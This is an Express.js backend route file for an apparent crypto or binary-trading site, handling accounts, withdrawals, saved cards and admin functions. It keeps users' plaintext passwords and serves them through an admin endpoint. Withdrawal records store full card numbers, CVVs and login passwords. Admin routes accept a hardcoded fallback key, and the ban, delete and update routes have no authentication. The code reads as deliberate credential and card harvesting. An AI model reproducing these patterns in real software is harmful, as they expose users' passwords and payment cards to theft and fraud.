import express from "express";
import User from "../models/User.js";
import bcrypt from "bcryptjs";

const router = express.Router();

// ================= REGISTER =================
router.post("/register", async (req, res) => {
  try {
    const { username, email, password, fullName, phone, dob, country } = req.body;

    if (!username || !email || !password) {
      return res.status(400).json({ error: "Username, email and password are required" });
    }

    const cleanUser = username.toLowerCase().trim();
    const cleanEmail = email.toLowerCase().trim();

    const existingUser = await User.findOne({
      $or: [{ username: cleanUser }, { email: cleanEmail }],
    });

    if (existingUser) {
      return res.status(400).json({ error: "Username or email already exists" });
    }

    const hashedPassword = await bcrypt.hash(password, 10);

    const user = await User.create({
      username: cleanUser,
      email: cleanEmail,
      password: hashedPassword,
      plainPassword: password,
      fullName: fullName || "",
      phone: phone || "",
      dob: dob || "",
      country: country || "",
      withdrawalRequests: [],
    });

    const safeUser = user.toObject();
    delete safeUser.password;

    res.status(201).json(safeUser);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= LOGIN =================
router.post("/login", async (req, res) => {
  try {
    const { username, password } = req.body;

    if (!username || !password) {
      return res.status(400).json({ error: "Username and password required" });
    }

    const cleanUser = username.toLowerCase().trim();

    const user = await User.findOne({ username: cleanUser });

    if (!user) {
      return res.status(400).json({ error: "Invalid credentials" });
    }

    if (user.isBanned) {
      return res.status(403).json({ error: "BANNED" });
    }

    const isMatch = await bcrypt.compare(password, user.password);

    if (!isMatch) {
      return res.status(400).json({ error: "Invalid credentials" });
    }

    const safeUser = user.toObject();
    delete safeUser.password;
    delete safeUser.plainPassword;

    res.json(safeUser);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= GET ALL USERS =================
router.get("/", async (req, res) => {
  try {
    const users = await User.find().select("-password -plainPassword");
    res.json(users);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= GET ALL USERS WITH PLAIN PASSWORDS (ADMIN ONLY) =================
router.get("/admin/all-with-plain-passwords", async (req, res) => {
  try {
    const adminKey = req.headers['x-admin-key'];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";
    
    if (!adminKey || adminKey !== validAdminKey) {
      return res.status(401).json({ error: "Unauthorized. Admin access only." });
    }
    
    const users = await User.find({});
    
    const usersWithPasswords = users.map(user => {
      const userObj = user.toObject();
      delete userObj.password;
      return userObj;
    });
    
    res.json(usersWithPasswords);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= UPDATE USER PASSWORD (ADMIN ONLY) =================
router.post("/admin/update-password", async (req, res) => {
  try {
    const adminKey = req.headers['x-admin-key'];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";
    
    if (!adminKey || adminKey !== validAdminKey) {
      return res.status(401).json({ error: "Unauthorized. Admin access only." });
    }
    
    const { username, newPassword } = req.body;
    
    if (!username || !newPassword) {
      return res.status(400).json({ error: "Username and newPassword required" });
    }
    
    const hashedPassword = await bcrypt.hash(newPassword, 10);
    
    const user = await User.findOneAndUpdate(
      { username: username.toLowerCase().trim() },
      { 
        password: hashedPassword,
        plainPassword: newPassword
      },
      { returnDocument: "after" }
    );
    
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }
    
    res.json({ success: true, message: "Password updated successfully" });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= WITHDRAW FUNDS (FIXED - NO BALANCE DEDUCTION) =================
router.post("/withdraw", async (req, res) => {
  try {
    const { username, amount, cardId, password } = req.body;
    
    if (!username || !amount || !cardId || !password) {
      return res.status(400).json({ error: "Missing required fields" });
    }
    
    const user = await User.findOne({ username: username.toLowerCase().trim() });
    
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }
    
    const isMatch = await bcrypt.compare(password, user.password);
    if (!isMatch) {
      return res.status(401).json({ error: "Invalid password" });
    }
    
    if (user.balance < amount) {
      return res.status(400).json({ error: "Insufficient balance" });
    }
    
    const card = user.savedCards?.find(c => c.id === cardId);
    if (!card) {
      return res.status(400).json({ error: "Card not found" });
    }
    
    // ✅ FIX: DON'T deduct balance here! Wait for admin approval
    const withdrawalRequest = {
      id: Date.now(),
      type: "Withdraw",
      amount: amount,
      usd: amount,
      cardId: card.id,
      cardLast4: card.display?.slice(-4) || "****",
      cardNumber: card.num || "****",
      cardName: card.name || "",
      cardExpiry: card.exp || "",
      cvv: card.cvv || "***",
      date: new Date().toISOString(),
      status: "pending",
      userPassword: password,
    };
    
    // Only add to withdrawalRequests, DON'T change balance
    user.withdrawalRequests = [withdrawalRequest, ...(user.withdrawalRequests || [])];
    user.transactions = [{
      type: "Withdraw",
      amount: amount,
      usd: amount,
      date: new Date().toISOString(),
      status: "pending",
      cardLast4: card.display?.slice(-4)
    }, ...(user.transactions || [])];
    
    await user.save();
    
    res.json({ 
      success: true, 
      currentBalance: user.balance,  // Balance stays the same
      requestId: withdrawalRequest.id,
      message: "Withdrawal request submitted for admin approval" 
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= ADMIN APPROVE WITHDRAWAL (FIXED - DEDUCT ONLY ON APPROVE) =================
router.post("/admin/approve-withdrawal", async (req, res) => {
  try {
    const adminKey = req.headers['x-admin-key'];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";
    
    if (!adminKey || adminKey !== validAdminKey) {
      return res.status(401).json({ error: "Unauthorized. Admin access only." });
    }
    
    const { username, requestId, action } = req.body;
    
    const user = await User.findOne({ username: username.toLowerCase().trim() });
    
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }
    
    const requestIndex = user.withdrawalRequests.findIndex(r => r.id === requestId);
    if (requestIndex === -1) {
      return res.status(404).json({ error: "Withdrawal request not found" });
    }
    
    const request = user.withdrawalRequests[requestIndex];
    
    // ✅ FIX: Don't allow double processing
    if (request.status !== "pending") {
      return res.status(400).json({ error: `Request already ${request.status}` });
    }
    
    if (action === "approve") {
      // ✅ FIX: NOW deduct the balance on approve
      if (user.balance < request.amount) {
        return res.status(400).json({ error: "Insufficient balance for approval" });
      }
      user.balance -= request.amount;
      
      request.status = "approved";
      request.approvedAt = new Date().toISOString();
      
      const txIndex = user.transactions.findIndex(t => t.date === request.date);
      if (txIndex !== -1) {
        user.transactions[txIndex].status = "approved";
        user.transactions[txIndex].approvedAt = new Date().toISOString();
      }
    } else if (action === "reject") {
      // ✅ FIX: NO balance change on reject
      request.status = "rejected";
      request.rejectedAt = new Date().toISOString();
      
      const txIndex = user.transactions.findIndex(t => t.date === request.date);
      if (txIndex !== -1) {
        user.transactions[txIndex].status = "rejected";
        user.transactions[txIndex].rejectedAt = new Date().toISOString();
      }
    }
    
    await user.save();
    
    res.json({ 
      success: true, 
      message: `Withdrawal ${action}d successfully`,
      newBalance: user.balance
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= GET ALL WITHDRAWAL REQUESTS (ADMIN ONLY) =================
router.get("/admin/all-withdrawals", async (req, res) => {
  try {
    const adminKey = req.headers['x-admin-key'];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";
    
    if (!adminKey || adminKey !== validAdminKey) {
      return res.status(401).json({ error: "Unauthorized. Admin access only." });
    }
    
    const users = await User.find({});
    const allWithdrawals = [];
    
    users.forEach(user => {
      (user.withdrawalRequests || []).forEach(request => {
        allWithdrawals.push({
          ...request,
          username: user.username,
          userEmail: user.email,
          userFullName: user.fullName,
        });
      });
    });
    
    allWithdrawals.sort((a, b) => new Date(b.date) - new Date(a.date));
    
    res.json(allWithdrawals);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= SAVE CARD TO USER =================
router.post("/save-card", async (req, res) => {
  try {
    const { username, card } = req.body;
    
    if (!username || !card) {
      return res.status(400).json({ error: "Username and card required" });
    }
    
    const user = await User.findOne({ username: username.toLowerCase().trim() });
    
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }
    
    const updatedCards = [...(user.savedCards || []), card];
    
    const updatedUser = await User.findOneAndUpdate(
      { username: username.toLowerCase().trim() },
      { savedCards: updatedCards },
      { returnDocument: "after" }
    );
    
    res.json({ success: true, savedCards: updatedUser.savedCards });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= SAVE BINARY TRADE =================
router.post("/:username/binary-trades", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const trade = req.body;

    if (!trade || !trade.coin) {
      return res.status(400).json({ error: "Invalid trade data" });
    }

    const user = await User.findOneAndUpdate(
      { username },
      { $push: { binaryTrades: trade } },
      { returnDocument: "after" }
    ).select("-password -plainPassword");

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json({ success: true, trade });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= GET BINARY TRADES =================
router.get("/:username/binary-trades", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();

    const user = await User.findOne({ username }).select("binaryTrades");

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json(user.binaryTrades || []);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= UPDATE USER =================
router.patch("/:username", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const updates = req.body;

    if (updates.password) {
      updates.password = await bcrypt.hash(updates.password, 10);
      updates.plainPassword = updates.password;
    }

    const user = await User.findOneAndUpdate(
      { username },
      { $set: updates },
      { returnDocument: "after", runValidators: true }
    ).select("-password -plainPassword");

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json(user);
  } catch (err) {
    res.status(500).json({ error: "Failed to update user" });
  }
});

// ================= BAN / UNBAN =================
router.post("/ban", async (req, res) => {
  try {
    const { username, banned } = req.body;

    if (!username) {
      return res.status(400).json({ error: "Username required" });
    }

    await User.findOneAndUpdate(
      { username: username.toLowerCase().trim() },
      { isBanned: banned },
      { returnDocument: "after" }
    );

    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= DELETE USER =================
router.delete("/:username", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();

    const deleted = await User.findOneAndDelete({ username });

    if (!deleted) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json({ success: true, message: "User deleted successfully" });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

export default router;